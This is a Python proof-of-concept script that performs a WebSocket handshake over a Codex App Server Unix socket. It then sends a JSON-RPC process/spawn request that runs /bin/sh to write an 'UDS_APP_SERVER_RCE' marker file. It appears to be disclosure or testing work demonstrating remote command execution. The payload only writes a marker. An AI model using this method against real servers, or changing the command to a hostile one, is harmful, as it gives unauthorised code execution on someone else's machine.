#!/usr/bin/env python3
"""Marker-only JSON-RPC client for a Codex App Server Unix WebSocket listener."""

from __future__ import annotations

import argparse
import base64
import hashlib
import json
import os
import socket
import struct
import sys
import time
from pathlib import Path
from typing import Any

WEBSOCKET_GUID = "258EAFA5-E914-47DA-95CA-C5AB0DC85B11"


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser()
    parser.add_argument("--socket", type=Path, required=True)
    parser.add_argument("--marker", type=Path)
    parser.add_argument("--cwd", type=Path, required=True)
    parser.add_argument("--probe-only", action="store_true")
    parser.add_argument("--timeout", type=float, default=15)
    return parser.parse_args()


def recv_exact(stream: socket.socket, length: int) -> bytes:
    chunks: list[bytes] = []
    remaining = length
    while remaining:
        chunk = stream.recv(remaining)
        if not chunk:
            raise ConnectionError("unexpected EOF")
        chunks.append(chunk)
        remaining -= len(chunk)
    return b"".join(chunks)


def send_frame(stream: socket.socket, opcode: int, payload: bytes) -> None:
    first = 0x80 | opcode
    mask = os.urandom(4)
    length = len(payload)
    if length < 126:
        header = bytes((first, 0x80 | length))
    elif length <= 0xFFFF:
        header = bytes((first, 0x80 | 126)) + struct.pack("!H", length)
    else:
        header = bytes((first, 0x80 | 127)) + struct.pack("!Q", length)
    masked = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
    stream.sendall(header + mask + masked)


def recv_frame(stream: socket.socket) -> tuple[int, bytes]:
    first, second = recv_exact(stream, 2)
    if not first & 0x80:
        raise RuntimeError("fragmented WebSocket frames are not supported")
    opcode = first & 0x0F
    masked = bool(second & 0x80)
    length = second & 0x7F
    if length == 126:
        length = struct.unpack("!H", recv_exact(stream, 2))[0]
    elif length == 127:
        length = struct.unpack("!Q", recv_exact(stream, 8))[0]
    mask = recv_exact(stream, 4) if masked else None
    payload = recv_exact(stream, length)
    if mask:
        payload = bytes(value ^ mask[index % 4] for index, value in enumerate(payload))
    return opcode, payload


def connect_websocket(socket_path: Path, timeout: float) -> socket.socket:
    stream = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    stream.settimeout(timeout)
    stream.connect(str(socket_path))
    key = base64.b64encode(os.urandom(16)).decode()
    request = (
        "GET /rpc HTTP/1.1\r\n"
        "Host: localhost\r\n"
        "Upgrade: websocket\r\n"
        "Connection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\n"
        "Sec-WebSocket-Version: 13\r\n"
        "\r\n"
    )
    stream.sendall(request.encode("ascii"))
    response = bytearray()
    while b"\r\n\r\n" not in response:
        response.extend(recv_exact(stream, 1))
        if len(response) > 16384:
            raise RuntimeError("oversized WebSocket handshake")
    header_text = response.decode("latin1")
    if " 101 " not in header_text.splitlines()[0]:
        raise RuntimeError(f"WebSocket upgrade failed: {header_text.splitlines()[0]}")
    headers = {}
    for line in header_text.split("\r\n")[1:]:
        if ":" in line:
            name, value = line.split(":", 1)
            headers[name.lower()] = value.strip()
    expected = base64.b64encode(
        hashlib.sha1((key + WEBSOCKET_GUID).encode("ascii")).digest()
    ).decode()
    if headers.get("sec-websocket-accept") != expected:
        raise RuntimeError("invalid Sec-WebSocket-Accept")
    return stream


def send_json(stream: socket.socket, value: dict[str, Any]) -> None:
    send_frame(stream, 0x1, json.dumps(value, separators=(",", ":")).encode())


def recv_json(stream: socket.socket) -> dict[str, Any]:
    while True:
        opcode, payload = recv_frame(stream)
        if opcode == 0x1:
            return json.loads(payload)
        if opcode == 0x8:
            raise ConnectionError("server closed WebSocket")
        if opcode == 0x9:
            send_frame(stream, 0xA, payload)


def wait_for_id(stream: socket.socket, request_id: int) -> tuple[dict[str, Any], list[dict[str, Any]]]:
    observed: list[dict[str, Any]] = []
    while True:
        message = recv_json(stream)
        observed.append(message)
        if message.get("id") == request_id:
            if "error" in message:
                raise RuntimeError(f"request {request_id} failed: {message['error']}")
            return message, observed


def main() -> int:
    args = parse_args()
    stream = connect_websocket(args.socket, args.timeout)
    transcript: list[dict[str, Any]] = []
    try:
        send_json(
            stream,
            {
                "id": 1,
                "method": "initialize",
                "params": {
                    "clientInfo": {
                        "name": "uds-marker-poc",
                        "title": "UDS marker PoC",
                        "version": "0.1.0",
                    },
                    "capabilities": {"experimentalApi": True},
                },
            },
        )
        initialized, seen = wait_for_id(stream, 1)
        transcript.extend(seen)
        send_json(stream, {"method": "notifications/initialized"})
        if args.probe_only:
            print(json.dumps({"initialized": initialized, "verdict": "CONNECTED"}, indent=2))
            return 0
        if args.marker is None:
            raise RuntimeError("--marker is required unless --probe-only is used")

        handle = f"uds-marker-{os.getpid()}-{int(time.time())}"
        command = [
            "/bin/sh",
            "-c",
            "umask 077; printf '%s\\n' UDS_APP_SERVER_RCE > \"$1\"",
            "sh",
            str(args.marker),
        ]
        send_json(
            stream,
            {
                "id": 2,
                "method": "process/spawn",
                "params": {
                    "command": command,
                    "processHandle": handle,
                    "cwd": str(args.cwd.resolve()),
                    "timeoutMs": 10000,
                    "outputBytesCap": 65536,
                },
            },
        )

        spawn_ack = None
        exited = None
        deadline = time.monotonic() + args.timeout
        while time.monotonic() < deadline and (spawn_ack is None or exited is None):
            message = recv_json(stream)
            transcript.append(message)
            if message.get("id") == 2:
                if "error" in message:
                    raise RuntimeError(f"process/spawn failed: {message['error']}")
                spawn_ack = message
            if (
                message.get("method") == "process/exited"
                and (message.get("params") or {}).get("processHandle") == handle
            ):
                exited = message
        if spawn_ack is None or exited is None:
            raise TimeoutError("did not observe both spawn acknowledgement and process/exited")
        exit_code = (exited.get("params") or {}).get("exitCode")
        result = {
            "socket": str(args.socket),
            "process_handle": handle,
            "spawn_acknowledged": True,
            "exit_code": exit_code,
            "marker": str(args.marker),
            "transcript": transcript,
            "verdict": "COMMAND_COMPLETED" if exit_code == 0 else "COMMAND_FAILED",
        }
        print(json.dumps(result, ensure_ascii=False, indent=2))
        return 0 if exit_code == 0 else 1
    finally:
        try:
            send_frame(stream, 0x8, b"")
        except OSError:
            pass
        stream.close()


if __name__ == "__main__":
    raise SystemExit(main())

